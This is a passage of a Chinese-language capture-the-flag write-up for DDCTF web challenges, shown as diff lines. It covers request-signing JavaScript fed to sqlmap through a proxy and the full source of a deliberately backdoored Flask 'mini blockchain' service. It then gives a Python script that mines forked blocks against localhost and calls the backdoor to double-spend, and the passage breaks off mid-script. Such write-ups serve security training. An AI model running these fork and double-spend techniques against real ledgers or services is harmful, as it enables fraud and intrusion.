+ var c = -1732584194;
+ var d = 271733878;
+ var e = -1009589776;
+ for (var i = 0; i &lt; x.length; i += 16) {
+  var olda = a;
+  var oldb = b;
+  var oldc = c;
+  var oldd = d;
+  var olde = e;
+  for (var j = 0; j &lt; 80; j++) {
+   if (j &lt; 16) w[j] = x[i + j];
+   else w[j] = rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1);
+   var t = safe_add(safe_add(rol(a, 5), math_enc_ft(j, b, c, d)), safe_add(safe_add(e, w[j]), math_enc_kt(j)));
+   e = d;
+   d = c;
+   c = rol(b, 30);
+   b = a;
+   a = t;
+  }
+  a = safe_add(a, olda);
+  b = safe_add(b, oldb);
+  c = safe_add(c, oldc);
+  d = safe_add(d, oldd);
+  e = safe_add(e, olde);
+ }
+ return Array(a, b, c, d, e);
+}
+/*
+ * Perform the appropriate triplet combination function for the current
+ * iteration
+ */
+function math_enc_ft(t, b, c, d) {
+ if (t &lt; 20) return (b &amp; c) | ((~b) &amp; d);
+ if (t &lt; 40) return b ^ c ^ d;
+ if (t &lt; 60) return (b &amp; c) | (b &amp; d) | (c &amp; d);
+ return b ^ c ^ d;
+}
+/*
+ * Determine the appropriate additive constant for the current iteration
+ */
+function math_enc_kt(t) {
+ return (t &lt; 20) ? 1518500249 : (t &lt; 40) ? 1859775393 : (t &lt; 60) ? -1894007588 : -899497514;
+}
+/*
+ * Calculate the HMAC-SHA1 of a key and some data
+ */
+function core_hmac_math_enc(key, data) {
+ var bkey = str2binb(key);
+ if (bkey.length &gt; 16) bkey = core_math_enc(bkey, key.length * chrsz);
+ var ipad = Array(16),
+  opad = Array(16);
+ for (var i = 0; i &lt; 16; i++) {
+  ipad[i] = bkey[i] ^ 0x36363636;
+  opad[i] = bkey[i] ^ 0x5C5C5C5C;
+ }
+ var hash = core_math_enc(ipad.concat(str2binb(data)), 512 + data.length * chrsz);
+ return core_math_enc(opad.concat(hash), 512 + 160);
+}
+/*
+ * Add integers, wrapping at 2^32. This uses 16-bit operations internally
+ * to work around bugs in some JS interpreters.
+ */
+function safe_add(x, y) {
+ var lsw = (x &amp; 0xFFFF) + (y &amp; 0xFFFF);
+ var msw = (x &gt;&gt; 16) + (y &gt;&gt; 16) + (lsw &gt;&gt; 16);
+ return (msw &lt;&lt; 16) | (lsw &amp; 0xFFFF);
+}
+/*
+ * Bitwise rotate a 32-bit number to the left.
+ */
+function rol(num, cnt) {
+ return (num &lt;&lt; cnt) | (num &gt;&gt;&gt; (32 - cnt));
+}
+/*
+ * Convert an 8-bit or 16-bit string to an array of big-endian words
+ * In 8-bit function, characters &gt;255 have their hi-byte silently ignored.
+ */
+function str2binb(str) {
+ var bin = Array();
+ var mask = (1 &lt;&lt; chrsz) - 1;
+ for (var i = 0; i &lt; str.length * chrsz; i += chrsz)
+ bin[i &gt;&gt; 5] |= (str.charCodeAt(i / chrsz) &amp; mask) &lt;&lt; (24 - i % 32);
+ return bin;
+}
+/*
+ * Convert an array of big-endian words to a string
+ */
+function binb2str(bin) {
+ var str = &quot;&quot;;
+ var mask = (1 &lt;&lt; chrsz) - 1;
+ for (var i = 0; i &lt; bin.length * 32; i += chrsz)
+ str += String.fromCharCode((bin[i &gt;&gt; 5] &gt;&gt;&gt; (24 - i % 32)) &amp; mask);
+ return str;
+}
+/*
+ * Convert an array of big-endian words to a hex string.
+ */
+function binb2hex(binarray) {
+ var hex_tab = hexcase ? &quot;0123456789ABCDEF&quot; : &quot;0123456789abcdef&quot;;
+ var str = &quot;&quot;;
+ for (var i = 0; i &lt; binarray.length * 4; i++) {
+  str += hex_tab.charAt((binarray[i &gt;&gt; 2] &gt;&gt; ((3 - i % 4) * 8 + 4)) &amp; 0xF) + hex_tab.charAt((binarray[i &gt;&gt; 2] &gt;&gt; ((3 - i % 4) * 8)) &amp; 0xF);
+ }
+ return str;
+}
+/*
+ * Convert an array of big-endian words to a base-64 string
+ */
+function binb2b64(binarray) {
+ var tab = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;
+ var str = &quot;&quot;;
+ for (var i = 0; i &lt; binarray.length * 4; i += 3) {
+  var triplet = (((binarray[i &gt;&gt; 2] &gt;&gt; 8 * (3 - i % 4)) &amp; 0xFF) &lt;&lt; 16) | (((binarray[i + 1 &gt;&gt; 2] &gt;&gt; 8 * (3 - (i + 1) % 4)) &amp; 0xFF) &lt;&lt; 8) | ((binarray[i + 2 &gt;&gt; 2] &gt;&gt; 8 * (3 - (i + 2) % 4)) &amp; 0xFF);
+  for (var j = 0; j &lt; 4; j++) {
+   if (i * 8 + j * 6 &gt; binarray.length * 32) str += b64pad;
+   else str += tab.charAt((triplet &gt;&gt; 6 * (3 - j)) &amp; 0x3F);
+  }
+ }
+ return str;
+}
+
+
+function signGenerate(obj, key) {
+    var str0 = &#39;&#39;;
+    for(i in obj){
+      if(i!=&#39;sign&#39;){
+        str1=&#39;&#39;;
+        str1=i+&#39;=&#39;+obj[i];
+        str0+=str1
+      }
+    }
+    return hex_math_enc(str0+key)
+};
+
+var obj={id:&#39;&#39;,title:&#39;&#39;,author:&#39;&#39;,date:&#39;&#39;,time:parseInt(new Date().getTime()/1000)};
+
+function submitt(){
+  obj[&#39;id&#39;]=document.getElementById(&#39;id&#39;).value;
+  obj[&#39;title&#39;]=document.getElementById(&#39;title&#39;).value;
+  obj[&#39;author&#39;]=document.getElementById(&#39;author&#39;).value;
+  obj[&#39;date&#39;]=document.getElementById(&#39;date&#39;).value;
+  var sign=signGenerate(obj,key);
+  document.getElementById(&#39;queryForm&#39;).action=&quot;index.php?sig=&quot;+sign+&quot;&amp;time=&quot;+obj.time;
+  document.getElementById(&#39;queryForm&#39;).submit()
+}
+
+function submitgg(id, title, date, author){
+  obj[&#39;id&#39;]=id;
+  obj[&#39;title&#39;]=title;
+  obj[&#39;author&#39;]=author;
+  obj[&#39;date&#39;]=date;
+  // return obj;
+  var sign=signGenerate(obj,key);
+  return &quot;index.php?sig=&quot;+sign+&quot;&amp;time=&quot;+obj.time;
+}</code></pre>
+<p>这里，我们为了方便输入在js中添加了个<code>submitgg</code>函数，其他直接复制题目给的js。</p>
+<p>运行代理服务器，此时可以</p>
+<p><img src="/img/ddctf/4.png" alt=""></p>
+<p>OK，将代理服务器的链接用于<code>sqlmap</code></p>
+<p><img src="/img/ddctf/5.png" alt=""></p>
+<p><img src="/img/ddctf/6.png" alt=""></p>
+<h3 id="Web-4-mini-blockchain"><a href="#Web-4-mini-blockchain" class="headerlink" title="Web 4 mini blockchain"></a>Web 4 mini blockchain</h3><p>某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过程。不幸的是，该银行被黑客入侵，私钥被窃取，维持区块链正常运转的矿机也全部宕机。现在，你能追回所有DDCoins，并且从商店购买2颗钻石么？</p>
+<pre><code class="python"># -*- encoding: utf-8 -*-
+# written in python 2.7
+__author__ = &#39;garzon&#39;
+
+import hashlib, json, rsa, uuid, os
+from flask import Flask, session, redirect, url_for, escape, request
+
+app = Flask(__name__)
+app.secret_key = &#39;*********************&#39;
+url_prefix = &#39;/b9af31f66147e&#39;
+
+def FLAG():
+    return &#39;Here is your flag: DDCTF{******************}&#39;
+
+def hash(x):
+    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()
+
+def hash_reducer(x, y):
+    return hash(hash(x)+hash(y))
+
+def has_attrs(d, attrs):
+    if type(d) != type({}): raise Exception(&quot;Input should be a dict/JSON&quot;)
+    for attr in attrs:
+        if attr not in d:
+            raise Exception(&quot;{} should be presented in the input&quot;.format(attr))
+
+EMPTY_HASH = &#39;0&#39;*64
+
+def addr_to_pubkey(address):
+    return rsa.PublicKey(int(address, 16), 65537)
+
+def pubkey_to_address(pubkey):
+    assert pubkey.e == 65537
+    hexed = hex(pubkey.n)
+    if hexed.endswith(&#39;L&#39;): hexed = hexed[:-1]
+    if hexed.startswith(&#39;0x&#39;): hexed = hexed[2:]
+    return hexed
+
+def gen_addr_key_pair():
+    pubkey, privkey = rsa.newkeys(384)
+    return pubkey_to_address(pubkey), privkey
+
+bank_address, bank_privkey = gen_addr_key_pair()
+hacker_address, hacker_privkey = gen_addr_key_pair()
+shop_address, shop_privkey = gen_addr_key_pair()
+shop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()
+
+def sign_input_utxo(input_utxo_id, privkey):
+    return rsa.sign(input_utxo_id, privkey, &#39;SHA-1&#39;).encode(&#39;hex&#39;)
+
+def hash_utxo(utxo):
+    return reduce(hash_reducer, [utxo[&#39;id&#39;], utxo[&#39;addr&#39;], str(utxo[&#39;amount&#39;])])
+
+def create_output_utxo(addr_to, amount):
+    utxo = {&#39;id&#39;: str(uuid.uuid4()), &#39;addr&#39;: addr_to, &#39;amount&#39;: amount}
+    utxo[&#39;hash&#39;] = hash_utxo(utxo)
+    return utxo
+
+def hash_tx(tx):
+    return reduce(hash_reducer, [
+        reduce(hash_reducer, tx[&#39;input&#39;], EMPTY_HASH),
+        reduce(hash_reducer, [utxo[&#39;hash&#39;] for utxo in tx[&#39;output&#39;]], EMPTY_HASH)
+    ])
+
+def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
+    tx = {&#39;input&#39;: input_utxo_ids, &#39;signature&#39;: [sign_input_utxo(id, privkey_from) for id in input_utxo_ids], &#39;output&#39;: output_utxo}
+    tx[&#39;hash&#39;] = hash_tx(tx)
+    return tx
+
+def hash_block(block):
+    return reduce(hash_reducer, [block[&#39;prev&#39;], block[&#39;nonce&#39;], reduce(hash_reducer, [tx[&#39;hash&#39;] for tx in block[&#39;transactions&#39;]], EMPTY_HASH)])
+
+def create_block(prev_block_hash, nonce_str, transactions):
+    if type(prev_block_hash) != type(&#39;&#39;): raise Exception(&#39;prev_block_hash should be hex-encoded hash value&#39;)
+    nonce = str(nonce_str)
+    if len(nonce) &gt; 128: raise Exception(&#39;the nonce is too long&#39;)
+    block = {&#39;prev&#39;: prev_block_hash, &#39;nonce&#39;: nonce, &#39;transactions&#39;: transactions}
+    block[&#39;hash&#39;] = hash_block(block)
+    return block
+
+def find_blockchain_tail():
+    return max(session[&#39;blocks&#39;].values(), key=lambda block: block[&#39;height&#39;])
+
+def calculate_utxo(blockchain_tail):
+    curr_block = blockchain_tail
+    blockchain = [curr_block]
+    while curr_block[&#39;hash&#39;] != session[&#39;genesis_block_hash&#39;]:
+        curr_block = session[&#39;blocks&#39;][curr_block[&#39;prev&#39;]]
+        blockchain.append(curr_block)
+    blockchain = blockchain[::-1]
+    utxos = {}
+    for block in blockchain:
+        for tx in block[&#39;transactions&#39;]:
+            for input_utxo_id in tx[&#39;input&#39;]:
+                del utxos[input_utxo_id]
+            for utxo in tx[&#39;output&#39;]:
+                utxos[utxo[&#39;id&#39;]] = utxo
+    return utxos
+
+def calculate_balance(utxos):
+    balance = {bank_address: 0, hacker_address: 0, shop_address: 0}
+    for utxo in utxos.values():
+        if utxo[&#39;addr&#39;] not in balance:
+            balance[utxo[&#39;addr&#39;]] = 0
+        balance[utxo[&#39;addr&#39;]] += utxo[&#39;amount&#39;]
+    return balance
+
+def verify_utxo_signature(address, utxo_id, signature):
+    try:
+        return rsa.verify(utxo_id, signature.decode(&#39;hex&#39;), addr_to_pubkey(address))
+    except:
+        return False
+
+def append_block(block, difficulty=int(&#39;f&#39;*64, 16)):
+    has_attrs(block, [&#39;prev&#39;, &#39;nonce&#39;, &#39;transactions&#39;])
+
+    if type(block[&#39;prev&#39;]) == type(u&#39;&#39;): block[&#39;prev&#39;] = str(block[&#39;prev&#39;])
+    if type(block[&#39;nonce&#39;]) == type(u&#39;&#39;): block[&#39;nonce&#39;] = str(block[&#39;nonce&#39;])
+    if block[&#39;prev&#39;] not in session[&#39;blocks&#39;]: raise Exception(&quot;unknown parent block&quot;)
+    tail = session[&#39;blocks&#39;][block[&#39;prev&#39;]]
+    utxos = calculate_utxo(tail)
+
+    if type(block[&#39;transactions&#39;]) != type([]): raise Exception(&#39;Please put a transaction array in the block&#39;)
+    new_utxo_ids = set()
+    for tx in block[&#39;transactions&#39;]:
+        has_attrs(tx, [&#39;input&#39;, &#39;output&#39;, &#39;signature&#39;])
+
+        for utxo in tx[&#39;output&#39;]:
+            has_attrs(utxo, [&#39;amount&#39;, &#39;addr&#39;, &#39;id&#39;])
+            if type(utxo[&#39;id&#39;]) == type(u&#39;&#39;): utxo[&#39;id&#39;] = str(utxo[&#39;id&#39;])
+            if type(utxo[&#39;addr&#39;]) == type(u&#39;&#39;): utxo[&#39;addr&#39;] = str(utxo[&#39;addr&#39;])
+            if type(utxo[&#39;id&#39;]) != type(&#39;&#39;): raise Exception(&quot;unknown type of id of output utxo&quot;)
+            if utxo[&#39;id&#39;] in new_utxo_ids: raise Exception(&quot;output utxo of same id({}) already exists.&quot;.format(utxo[&#39;id&#39;]))
+            new_utxo_ids.add(utxo[&#39;id&#39;])
+            if type(utxo[&#39;amount&#39;]) != type(1): raise Exception(&quot;unknown type of amount of output utxo&quot;)
+            if utxo[&#39;amount&#39;] &lt;= 0: raise Exception(&quot;invalid amount of output utxo&quot;)
+            if type(utxo[&#39;addr&#39;]) != type(&#39;&#39;): raise Exception(&quot;unknown type of address of output utxo&quot;)
+            try:
+                addr_to_pubkey(utxo[&#39;addr&#39;])
+            except:
+                raise Exception(&quot;invalid type of address({})&quot;.format(utxo[&#39;addr&#39;]))
+            utxo[&#39;hash&#39;] = hash_utxo(utxo)
+        tot_output = sum([utxo[&#39;amount&#39;] for utxo in tx[&#39;output&#39;]])
+
+        if type(tx[&#39;input&#39;]) != type([]): raise Exception(&quot;type of input utxo ids in tx should be array&quot;)
+        if type(tx[&#39;signature&#39;]) != type([]): raise Exception(&quot;type of input utxo signatures in tx should be array&quot;)
+        if len(tx[&#39;input&#39;]) != len(tx[&#39;signature&#39;]): raise Exception(&quot;lengths of arrays of ids and signatures of input utxos should be the same&quot;)
+        tot_input = 0
+        tx[&#39;input&#39;] = [str(i) if type(i) == type(u&#39;&#39;) else i for i in tx[&#39;input&#39;]]
+        tx[&#39;signature&#39;] = [str(i) if type(i) == type(u&#39;&#39;) else i for i in tx[&#39;signature&#39;]]
+        for utxo_id, signature in zip(tx[&#39;input&#39;], tx[&#39;signature&#39;]):
+            if type(utxo_id) != type(&#39;&#39;): raise Exception(&quot;unknown type of id of input utxo&quot;)
+            if utxo_id not in utxos: raise Exception(&quot;invalid id of input utxo. Input utxo({}) does not exist or it has been consumed.&quot;.format(utxo_id))
+            utxo = utxos[utxo_id]
+            if type(signature) != type(&#39;&#39;): raise Exception(&quot;unknown type of signature of input utxo&quot;)
+            if not verify_utxo_signature(utxo[&#39;addr&#39;], utxo_id, signature):
+                raise Exception(&quot;Signature of input utxo is not valid. You are not the owner of this input utxo({})!&quot;.format(utxo_id))
+            tot_input += utxo[&#39;amount&#39;]
+            del utxos[utxo_id]
+        if tot_output &gt; tot_input:
+            raise Exception(&quot;You don&#39;t have enough amount of DDCoins in the input utxo! {}/{}&quot;.format(tot_input, tot_output))
+        tx[&#39;hash&#39;] = hash_tx(tx)
+
+    block = create_block(block[&#39;prev&#39;], block[&#39;nonce&#39;], block[&#39;transactions&#39;])
+    block_hash = int(block[&#39;hash&#39;], 16)
+    if block_hash &gt; difficulty: raise Exception(&#39;Please provide a valid Proof-of-Work&#39;)
+    block[&#39;height&#39;] = tail[&#39;height&#39;]+1
+    if len(session[&#39;blocks&#39;]) &gt; 50: raise Exception(&#39;The blockchain is too long. Use ./reset to reset the blockchain&#39;)
+    if block[&#39;hash&#39;] in session[&#39;blocks&#39;]: raise Exception(&#39;A same block is already in the blockchain&#39;)
+    session[&#39;blocks&#39;][block[&#39;hash&#39;]] = block
+    session.modified = True
+
+def init():
+    if &#39;blocks&#39; not in session:
+        session[&#39;blocks&#39;] = {}
+        session[&#39;your_diamonds&#39;] = 0
+
+        # First, the bank issued some DDCoins ...
+        total_currency_issued = create_output_utxo(bank_address, 1000000)
+        genesis_transaction = create_tx([], [total_currency_issued]) # create DDCoins from nothing
+        genesis_block = create_block(EMPTY_HASH, &#39;The Times 03/Jan/2009 Chancellor on brink of second bailout for bank&#39;, [genesis_transaction])
+        session[&#39;genesis_block_hash&#39;] = genesis_block[&#39;hash&#39;]
+        genesis_block[&#39;height&#39;] = 0
+        session[&#39;blocks&#39;][genesis_block[&#39;hash&#39;]] = genesis_block
+
+        # Then, the bank was hacked by the hacker ...
+        handout = create_output_utxo(hacker_address, 999999)
+        reserved = create_output_utxo(bank_address, 1)
+        transferred = create_tx([total_currency_issued[&#39;id&#39;]], [handout, reserved], bank_privkey)
+        second_block = create_block(genesis_block[&#39;hash&#39;], &#39;HAHA, I AM THE BANK NOW!&#39;, [transferred])
+        append_block(second_block)
+
+        # Can you buy 2 diamonds using all DDCoins?
+        third_block = create_block(second_block[&#39;hash&#39;], &#39;a empty block&#39;, [])
+        append_block(third_block)
+
+def get_balance_of_all():
+    init()
+    tail = find_blockchain_tail()
+    utxos = calculate_utxo(tail)
+    return calculate_balance(utxos), utxos, tail
+
+@app.route(url_prefix+&#39;/&#39;)
+def homepage():
+    announcement = &#39;Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. &#39;
+    balance, utxos, _ = get_balance_of_all()
+    genesis_block_info = &#39;hash of genesis block: &#39; + session[&#39;genesis_block_hash&#39;]
+    addr_info = &#39;the bank\&#39;s addr: &#39; + bank_address + &#39;, the hacker\&#39;s addr: &#39; + hacker_address + &#39;, the shop\&#39;s addr: &#39; + shop_address
+    balance_info = &#39;Balance of all addresses: &#39; + json.dumps(balance)
+    utxo_info = &#39;All utxos: &#39; + json.dumps(utxos)
+    blockchain_info = &#39;Blockchain Explorer: &#39; + json.dumps(session[&#39;blocks&#39;])
+    view_source_code_link = &quot;&lt;a href=&#39;source_code&#39;&gt;View source code&lt;/a&gt;&quot;
+    return announcement+(&#39;&lt;br /&gt;&lt;br /&gt;\r\n\r\n&#39;.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info]))
+
+
+@app.route(url_prefix+&#39;/flag&#39;)
+def getFlag():
+    init()
+    if session[&#39;your_diamonds&#39;] &gt;= 2: return FLAG()
+    return &#39;To get the flag, you should buy 2 diamonds from the shop. You have {} diamonds now. To buy a diamond, transfer 1000000 DDCoins to &#39;.format(session[&#39;your_diamonds&#39;]) + shop_address
+
+def find_enough_utxos(utxos, addr_from, amount):
+    collected = []
+    for utxo in utxos.values():
+        if utxo[&#39;addr&#39;] == addr_from:
+            amount -= utxo[&#39;amount&#39;]
+            collected.append(utxo[&#39;id&#39;])
+        if amount &lt;= 0: return collected, -amount
+    raise Exception(&#39;no enough DDCoins in &#39; + addr_from)
+
+def transfer(utxos, addr_from, addr_to, amount, privkey):
+    input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount)
+    outputs = [create_output_utxo(addr_to, amount)]
+    if the_change != 0:
+        outputs.append(create_output_utxo(addr_from, the_change))
+    return create_tx(input_utxo_ids, outputs, privkey)
+
+@app.route(url_prefix+&#39;/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;&#39;)
+def free_ddcoin(address):
+    balance, utxos, tail = get_balance_of_all()
+    if balance[bank_address] == 0: return &#39;The bank has no money now.&#39;
+    try:
+        address = str(address)
+        addr_to_pubkey(address) # to check if it is a valid address
+        transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey)
+        new_block = create_block(tail[&#39;hash&#39;], &#39;b@cKd00R tr1993ReD&#39;, [transferred])
+        append_block(new_block)
+        return str(balance[bank_address]) + &#39; DDCoins are successfully sent to &#39; + address
+    except Exception, e:
+        return &#39;ERROR: &#39; + str(e)
+
+DIFFICULTY = int(&#39;00000&#39; + &#39;f&#39; * 59, 16)
+@app.route(url_prefix+&#39;/create_transaction&#39;, methods=[&#39;POST&#39;])
+def create_tx_and_check_shop_balance():
+    init()
+    try:
+        block = json.loads(request.data)
+        append_block(block, DIFFICULTY)
+        msg = &#39;transaction finished.&#39;
+    except Exception, e:
+        return str(e)
+
+    balance, utxos, tail = get_balance_of_all()
+    if balance[shop_address] == 1000000:
+        # when 1000000 DDCoins are received, the shop will give you a diamond
+        session[&#39;your_diamonds&#39;] += 1
+        # and immediately the shop will store the money somewhere safe.
+        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)
+        new_block = create_block(tail[&#39;hash&#39;], &#39;save the DDCoins in a cold wallet&#39;, [transferred])
+        append_block(new_block)
+        msg += &#39; You receive a diamond.&#39;
+    return msg
+
+
+# if you mess up the blockchain, use this to reset the blockchain.
+@app.route(url_prefix+&#39;/reset&#39;)
+def reset_blockchain():
+    if &#39;blocks&#39; in session: del session[&#39;blocks&#39;]
+    if &#39;genesis_block_hash&#39; in session: del session[&#39;genesis_block_hash&#39;]
+    return &#39;reset.&#39;
+
+@app.route(url_prefix+&#39;/source_code&#39;)
+def show_source_code():
+    source = open(&#39;serve.py&#39;, &#39;r&#39;)
+    html = &#39;&#39;
+    for line in source:
+        html += line.replace(&#39;&amp;&#39;,&#39;&amp;amp;&#39;).replace(&#39;\t&#39;, &#39;&amp;nbsp;&#39;*4).replace(&#39; &#39;,&#39;&amp;nbsp;&#39;).replace(&#39;&lt;&#39;, &#39;&amp;lt;&#39;).replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;).replace(&#39;\n&#39;, &#39;&lt;br /&gt;&#39;)
+    source.close()
+    return html
+
+if __name__ == &#39;__main__&#39;:
+    app.run(debug=False, host=&#39;0.0.0.0&#39;)
+</code></pre>
+<p>题目给的区块链是有三个区块，</p>
+<pre><code>1. 创世块银行1000000个币
+2. 黑客转走999999个币，给银行留下1个币
+3. 再有一个空的区块</code></pre><p><img src="/img/ddctf/1524447858.png" alt=""></p>
+<p>然后让你买2个钻石。</p>
+<p><img src="/img/ddctf/1524448043.png" alt=""></p>
+<p>OK，只要往商店的地址转钱，当该地址有1000000个币时，会给你一个钻石。注意到，这个钻石是储存在<code>session[&#39;your_diamonds&#39;]</code> 中。</p>
+<p>然后，添加一个区块，记录将商店中的币转走到冷钱包中。</p>
+<p>这里的主要问题在于，只有你在挖矿，即你可以控制全网算力（100%&gt;51%），所以你可以在任何地方进行分叉，否认之后所有的交易（否认一条，后面的都不成立的）。</p>
+<p><img src="/img/ddctf/1524447577.png" alt=""></p>
+<p>对了，这里还有个后门，当然，可用可不用</p>
+<p><img src="/img/ddctf/1524448911.png" alt=""></p>
+<p>分析下做法</p>
+<h4 id="利用后门"><a href="#利用后门" class="headerlink" title="利用后门"></a>利用后门</h4><p><img src="/img/ddctf/1524458373.png" alt=""></p>
+<pre><code class="python"># -*- encoding: utf-8 -*-
+import btc
+import rsa, uuid, json, copy
+import requests
+import re
+
+txout_id = str(uuid.uuid4())
+proxies = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}
+url_prefix = &quot;http://localhost:5000/b9af31f66147e&quot;
+ss = requests.session()
+ss.cookies.set(&quot;session&quot;,&quot;.eJzNVtuOm0gU_JWVn-cBGvCYSHmwF4yw0o2w2ybdURRxM9CAZzT2BLuj-fctnE1WGa_ysNqs1iOLy-BzqapThy-TrHvI2-PkzZeJXVhklhalmZF9XpSFOzNSZzorZ7lNSiM3nH3mGoa5n7r394W7n-5LYrolscneSqczwxlj1OmxHo-_ZZM3ExbEmqq6lsH2LNSqF2TdSa-1aeCbTNVdFFCD9ttB6Lkp-9Ch3vwslXCYLtooEUT22wvlXUdVfJGK1UxVA4vfvp283E3qsqnq0-SNcTc5PBzy8nvSXVB34XL9mCU7HXpz_c54rLNmdkFwJ_TZg0gcJZPzMbPCKiN2JQ6rx6w_4lxUOdmpjDhtGKzqNDl_Lt7Hlezdy3iNZ66JH5_Kz9-TIejwr3_nXzs8PaWHY5qfmocD6Plwgy0FhrEe8Yq8VSv60JReeGaKWtSLbeYJOwr8QSTUlHx-obrF9dZhaqFwX1OyAy_rJuLUFMBYJqymf2LbHB6fAe2Hj3eTh-fT1_Mvk7Qonr6nj_iuoQGSJ8se1IGeykFKU4A6hOqQFoi3juhXLQtC0BgbDGVFQajxTM10PDAeapqwRirfll6Hez6RfN2AZoOhHcp9O_IQl8dogTqCQC68RS5fj2Wm_cPzAbWZxvVz9yNAomcNgHBYInFc9ADAkNwnTFca1VhStSaE6VC1UlLF9ig-ZBhYsm4kr8wIX8rnDtWxZoCLKTHIbwAVf_HghSZCOkJVJ0ZCEv1uGFFC9TveQr_iRPVCid63RbJWjFf25OUFsB6b6pCenp_KEeWXjwjpZnvDyY29k6XWdEoc23Hv9_k0S2dmapV56dozgv-XRe6Y2axMzXvLcrKpm6VpZs6IezN8UbLqqbdTNAArva9R_2VEMuJFL7RsBK_OgoMpAlF41YUldJDXIpdNFOxqynNN9Q5sdA1YbiivLtGr4SOvh09sFl32fmGUm0WTBa5Kh7e3QyN0bAnAI5KVosofMOrmtSJUifMzRr4RxLcpWcIuYAEaLAQhAUtnoaGDXtaRN7ehEWhi1bAEco7_dmhGZHP7PnWnaZYT03D3DjAFxO7eNN0sT2dWWhYOsQzXyKZ728wtEJHOjNk0c_Msc1LLvEH2V9b_DVnzNbIbfxnGm6HabBYLvllsN_62ittltLksIm7m9Q3Kv9J8f25N1MvR63ZgwbqWSvaUb4FXfKZe3WL-YTeYOG9OqCowea3FlIQHACu-qKFQKwpwJ_DP8A0Dv9PwhoZWP1rTP56-n3malw8MXTMiiNDrDqiBJx8uMCLpXyTvcN2aSDpQvmqoEmdG4GtaYlp8B51aVMOzOL3IQIB3f5B8O8A74JHCEAroeznseVEDdUeq3BZ6NfZsMt7-4Gnu9fPK0qSX2zBAQpEAxojxrAyqV42EoCggp4lsKVn1ABUFbAFcAfPd2lJ1aKbumDc3Wb-EJaz7UXxM152sbixNerKPPEy-J07X48aA74bnd4lvIPRJjusDvk2vvj8fLe3u_7weXqFIg2UXcTzNsR1VV4-1Ic5FqC1yAyW1bqmqNJ7QjFOgB9l6kKNuUTO2bo-FgN9RHdqip0bEIfJbFAXkKJMxJIUMfS0hTYQgkKZJR7lyYVOonnm5CYKa28XwDcsgHKS3bDBOwHLXj4soCpY181hLOaQFo5cwcqZD2A9MXFUYNyhCC9QXnyWoY96iixIowYMZgA_Bl1iIW1MoOWJNmOej2wKLEmbAYWMexpXg7SDYDpgZ_KG5qjyUx-b46frG-Ok_e9O7PDw_fSoa0Hko4DbGyx8gEXQk.Db7w9Q.hqEXHtLsqopnbFpfz5UTfgca8LM&quot;)
+
+
+
+r = ss.get(url=url_prefix+&quot;/&quot;,proxies=proxies)
+
+
+#工作量证明
+def pow(b, difficulty, msg=&quot;&quot;):
+    nonce = 0
+    while nonce&lt;(2**32):
+        b[&#39;nonce&#39;] = msg+str(nonce)
+        b[&#39;hash&#39;] = btc.hash_block(b)
+        block_hash = int(b[&#39;hash&#39;], 16)
+        if block_hash &lt; difficulty:
+            return b
+        nonce+=1
+
+#构造一个空块
+def empty_block(msg, prevHash):
+    b={}
+    b[&quot;prev&quot;] = prevHash
+    b[&quot;transactions&quot;] = []
+    b = pow(b, btc.DIFFICULTY, msg)
+    return b
+
+def myprint(b):
+    print(json.dumps(b))
+    print(len(json.dumps(b)))
+
+def send_to_server(b):
+    data = json.dumps(b)
+    r = ss.post(url = url_prefix+&quot;/create_transaction&quot;,data = data, headers = {&quot;content-type&quot;:&quot;application/json&quot;},proxies = proxies)
+    print r.content
+
+def backdoor():
+    r = ss.get(url = url_prefix+&quot;/5ecr3t_free_D1diCoin_b@ckD00r/&quot;+shop_address, proxies = proxies)
+    print r.content
+    pass
+
+shop_address = &quot;c4a5cb163786cc944c488df9c8a5143356aecc87a8854c76fbb76f5715b947d7be5ddcc9c69d46b904a857ee9437c71b&quot;
+## 创世块的hash
+prev_block_hash = &quot;4d328ade1b2fcded980a568e8c42e0c05fb9001f6977d9f6fe219e242f3a6805&quot;
+
+# 空块
+print(&quot;empty block 1&quot;)
+block1 = empty_block(&quot;empty block&quot;,prev_block_hash)
+block1 = pow(block1, btc.DIFFICULTY)
+myprint(block1)
+send_to_server(block1)
+
+# 空块
+print(&quot;empty block 2&quot;)
+block2 = empty_block(&quot;empty block&quot;,block1[&#39;hash&#39;])
+block2 = pow(block2, btc.DIFFICULTY)
+myprint(block2)
+send_to_server(block2)
+
+# 空块
+print(&quot;empty block 3&quot;)
+block3 = empty_block(&quot;empty block&quot;,block2[&#39;hash&#39;])
+block3 = pow(block3, btc.DIFFICULTY)
+myprint(block3)
+send_to_server(block3)
+
+# 长度超过原链
+
+# 触发后门，银行转币到商店
+print(&quot;hit backdoor&quot;)
+backdoor()
+
+# 商店转走币，给你一颗钻石（这需要一次创建块才能触发，我们在分叉2中触发就OK）
+
+# 空块
+print(&quot;empty block 4, you will receive a diamond&quot;)
+block4 = empty_block(&quot;empty block&quot;,block3[&#39;hash&#39;])
+block4 = pow(block4, btc.DIFFICULTY)
+myprint(block4)
+send_to_server(block4)
+
+# 空块
+print(&quot;empty block 5&quot;)
+block5 = empty_block(&quot;empty block&quot;,block4[&#39;hash&#39;])
+block5 = pow(block5, btc.DIFFICULTY)
+myprint(block5)
+send_to_server(block5)
+
+# 空块
+print(&quot;empty block 6&quot;)
+block6 = empty_block(&quot;empty block&quot;,block5[&#39;hash&#39;])
+block6 = pow(block6, btc.DIFFICULTY)
+myprint(block6)
+send_to_server(block6)
+
+# 触发后门，银行转币到商店
+print(&quot;hit backdoor 2&quot;)
+backdoor()
+
+# 创建空块，触发商店转走币，给你一颗钻石
+print(&quot;empty block 7&quot;)
+block7 = empty_block(&quot;empty block&quot;,block6[&#39;hash&#39;])
+block7 = pow(block7, btc.DIFFICULTY)
+myprint(block7)
